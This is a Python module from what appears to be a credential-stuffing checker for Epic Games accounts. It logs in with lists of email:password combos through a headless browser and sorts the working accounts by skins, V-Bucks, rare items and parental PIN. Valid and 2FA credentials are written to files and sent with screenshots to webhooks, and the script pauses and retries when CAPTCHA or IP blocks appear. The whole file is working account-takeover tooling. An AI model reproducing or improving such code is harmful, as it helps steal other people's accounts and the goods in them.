import asyncio
import os

from src.logger import logger
from src.utils import remove_combo
from src.check import epic_games_login, LoginResult
from src.webhook import webhook_manager


async def check_account(email: str, password: str, paths: dict) -> None:
    max_attempts = 2
    pause_base = 5
    output_folder = paths.get("output_folder", "output/")

    for attempt in range(1, max_attempts + 2):
        if attempt > 1:
            logger.info(f"Checking {email}... (Attempt {attempt})")
        else:
            logger.info(f"Checking {email}...")

        result, message, extra = await epic_games_login(email, password, headless=True)

        if result == LoginResult.SUCCESS:
            logger.update_stat("hit")

            profile = extra or {}
            screenshot_bytes = profile.get("screenshot_bytes")
            is_banned = profile.get("is_banned", False)
            platforms = profile.get("platforms", [])
            last_match = profile.get("last_match")
            skin_count = profile.get("skin_count", 0)
            vbucks = profile.get("vbucks", 0)
            rare_skins = profile.get("rare_skins", [])
            parental_pin = profile.get("parental_pin", "No")

            pin_str = (
                f"PIN: {parental_pin}"
                if parental_pin and parental_pin != "No"
                else "PIN: No"
            )
            ban_str = "Yes" if is_banned else "No"
            rare_str = "Yes" if rare_skins else "No"
            og_str = (
                f"OG: {rare_str} ({', '.join(rare_skins[:5])})"
                if rare_skins
                else f"OG: {rare_str}"
            )
            platforms_str = ", ".join(platforms) if platforms else "None"
            if last_match and "T" in str(last_match):
                last_match_str = last_match.split("T")[0]
            elif last_match:
                last_match_str = str(last_match)[:10]
            else:
                last_match_str = "Unknown"

            try:
                skin_count = int(skin_count)
            except (ValueError, TypeError):
                skin_count = 0

            logger.stats["skins"] = logger.stats.get("skins", 0) + skin_count
            logger.success(
                f"✅ HIT: {email}:{password} | Skins: {skin_count} | {og_str} "
                f"| V-Bucks: {vbucks} | Ban: {ban_str} | Platforms: {platforms_str} "
                f"| Last: {last_match_str}"
            )

            if skin_count <= 10:
                bucket_file = "0-10.txt"
            elif skin_count <= 30:
                bucket_file = "11-30.txt"
            elif skin_count <= 50:
                bucket_file = "31-50.txt"
            else:
                bucket_file = "51-100+.txt"

            valid_dir = os.path.join(output_folder, "valid")
            os.makedirs(valid_dir, exist_ok=True)

            with open(
                os.path.join(valid_dir, bucket_file), "a", encoding="utf-8"
            ) as f:
                f.write(
                    f"Email: {email} | Pass: {password} | Skins: {skin_count} "
                    f"| VBucks: {vbucks} | {pin_str}\n"
                )

            with open(os.path.join(valid_dir, "valid.txt"), "a", encoding="utf-8") as f:
                f.write(
                    f"{email}:{password} | Skins: {skin_count} | VBucks: {vbucks} "
                    f"| Rare: {', '.join(rare_skins)}\n"
                )

            with open(
                os.path.join(output_folder, "shortcodehit.txt"), "a", encoding="utf-8"
            ) as f:
                f.write(f"{email}:{password}\n")

            if rare_skins:
                logger.update_stat("ogs")
                og_dir = os.path.join(output_folder, "ogs")
                os.makedirs(og_dir, exist_ok=True)
                pin_suffix = (
                    f" | PIN: {parental_pin}"
                    if parental_pin and parental_pin != "No"
                    else ""
                )
                with open(os.path.join(og_dir, bucket_file), "a", encoding="utf-8") as f:
                    f.write(
                        f"Email: {email} | Pass: {password} | Skins: {skin_count} "
                        f"| VBucks: {vbucks} | Rare: {', '.join(rare_skins)}"
                        f"{pin_suffix}\n"
                    )

            webhook_manager.send_hit(email, password, extra, screenshot_bytes)
            webhook_manager.send_shortcode(email, password, screenshot_bytes)
            webhook_manager.send_screenshot(email, password, screenshot_bytes)
            webhook_manager.update_live()
            remove_combo(email, password)

        elif result == LoginResult.INVALID_CREDS:
            logger.update_stat("bad")
            logger.error(f"❌ BAD ({message}) : {email}")
            bad_file = os.path.join(output_folder, "bad.txt")
            os.makedirs(output_folder, exist_ok=True)
            try:
                with open(bad_file, "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
            except Exception:
                pass
            webhook_manager.update_live()
            remove_combo(email, password)

        elif result == LoginResult.TWO_FACTOR:
            logger.update_stat("2fa")
            logger.warning(f"🔒 2FA : {email}:{password}")
            twofa_file = os.path.join(output_folder, "2fa.txt")
            os.makedirs(output_folder, exist_ok=True)
            with open(twofa_file, "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
            screenshot_bytes = (
                extra.get("screenshot_bytes") if isinstance(extra, dict) else None
            )
            webhook_manager.send_twofa(email, password, screenshot_bytes)
            webhook_manager.send_screenshot(email, password, screenshot_bytes)
            webhook_manager.update_live()
            remove_combo(email, password)

        elif result == LoginResult.CAPTCHA:
            if attempt <= max_attempts:
                wait_seconds = pause_base * attempt
                logger.warning(
                    f"⚠️ CAPTCHA / IP Bloquée ({message}) pour {email}. "
                    f"Pause de {wait_seconds}s..."
                )
                await asyncio.sleep(wait_seconds)
                continue
            else:
                captcha_file = os.path.join(output_folder, "captcha_ip_bloquee.txt")
                os.makedirs(output_folder, exist_ok=True)
                with open(captcha_file, "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
                logger.error(
                    f"⚠️ CAPTCHA persistant pour {email}. Compte conservé dans combo.txt."
                )

        else:
            logger.error(f"❌ Erreur pour {email}: {message}. Compte conservé dans combo.txt.")
            errors_file = os.path.join(output_folder, "errors.txt")
            os.makedirs(output_folder, exist_ok=True)
            with open(errors_file, "a", encoding="utf-8") as f:
                f.write(f"Email: {email} | Error: {message}\n")


async def worker(queue: asyncio.Queue, paths: dict, sem: asyncio.Semaphore) -> None:
    while not queue.empty():
        email, password = await queue.get()
        async with sem:
            await check_account(email, password, paths)
            logger.stats["remain"] -= 1
            webhook_manager.update_live()
        queue.task_done()